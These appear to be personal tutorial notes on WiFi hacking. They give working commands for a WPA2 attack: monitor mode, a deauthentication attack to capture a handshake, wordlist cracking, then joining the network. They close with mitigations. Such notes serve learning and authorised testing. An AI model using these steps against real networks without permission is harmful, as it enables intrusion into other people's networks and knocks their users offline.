
# Intro to WiFi Hacking Notes
- Notes by Anthony Picarello (BluP3gu1n)

## **Do not use these techniques on networks you are not given permission to attack, you will get in trouble**


### Tools
	- Aircrack-ng Suite
	- WiFi Pineapple
	- FlipperZero
	- WiFi Adapter
	- WiFi Cantenna / Extender
	- WiGLE
	- hashcat
	- cewl
	- crunch

### WPA2 Attack Methodology 

1. Get WiFi Adapter online in Kali
	1. Install Drivers (Alfa WiFi Card steps below)
	    1. Install Linux Kernel Headers
	    ```bash
	    sudo apt-get install linux-headers-$(uname -r)
	    ```
	    2. Clone GitHub package to /opt folder
	    ```bash
	    cd /opt
	    sudo git clone https://github.com/morrownr/8812au-20210629.git
	    ```
	    3. Run script
	    ```bash
	    cd /opt/8812au-20210629
	    sudo ./install-driver.sh
	    ```
	    4. Type 'No' when asked to change settings and 'Yes' to reboot
	    5. After reboot Alfa Adapter should light up and should be visible with the following command:
	    ```bash
	    iwconfig
	    ```
	2. Put adapter into monitor mode
	    1. Need to run airmon-ng with check-kill option:
	    ```bash
	    sudo airmon-ng check kill
	    sudo airmon-ng start <interface>
	    ```
2. Scan WiFi networks
    ```bash
    sudo airodump-ng <interface>
    ```
	1. Need to Identify the Following Info:
		1. BSSID (Access Point MAC Address)
		2. Channel number
		3. Client MAC Address
		4. Channel number
		5. Potential passwords
3. Launch DeAuth Attack on Client while listening to traffic
	1. Traffic can be captured with either airodump or wireshark
	2. Run aireplay
		1. Make sure to send a small number of deauth packets to capture handshake
	```bash
	sudo aireplay-ng -0 1 -a <BSSID> -c <Client mac (Station)> <name of interface> 
	```
	3. Stop traffic collection
4. Crack WiFi password
	1. Use aircrack-ng or hashcat`
		1. Run against a common wordlist (rockyou.txt) or generate your own wordlist (cewl, crunch or manually)
     	```bash
      	sudo aircrack-ng -w /path/to/wordlist <name of .cap file> 
      	```
5. One password is obtained, get on the network
	1. Need to restart network manager service
   		```bash
     		sudo ifconfig <interface> up
		sudo service NetworkManager restart
     		```
	2. Connect
	3. Complete additional objectives


### Mitigation's for WiFi attacks

- Use up-to-date encryption (WPA3)
- Use long and complex passwords not tied to anything in your personal life
- Have an isolated guest network for visitors
- Use a VPN when on public WiFi with others
- Turn off WiFi on phone when out and about
- Check and double check before connecting to a WiFi network

### Links

- Alfa WiFi adapter: https://www.amazon.com/Network-AWUS036ACS-Wide-Coverage-Dual-Band-High-Sensitivity/dp/B0752CTSGD/ref=sr_1_4

- Drivers for WiFi adapter: https://docs.alfa.com.tw/Support/Linux/RTL8811AU/

- Max Vision video: https://www.youtube.com/watch?v=cO1LRhcImSc

- Darknet Diaries Episode: https://darknetdiaries.com/episode/85/

